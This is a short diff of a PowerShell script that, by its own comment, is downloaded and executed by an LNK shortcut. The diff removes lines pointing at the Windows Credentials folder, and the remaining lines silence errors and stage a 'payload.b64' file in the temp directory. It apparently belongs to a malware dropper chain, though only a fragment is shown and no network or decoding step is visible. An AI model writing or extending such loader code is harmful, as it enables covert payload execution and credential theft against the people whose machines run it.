@@ -2,8 +2,6 @@
 # This script is downloaded and executed by the LNK
 
 $ErrorActionPreference = 'SilentlyContinue'
-$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
-$basePath = "$appData\Microsoft\Credentials"
 $tempPath = $env:TEMP
 
 $b64File = "$tempPath\payload.b64"
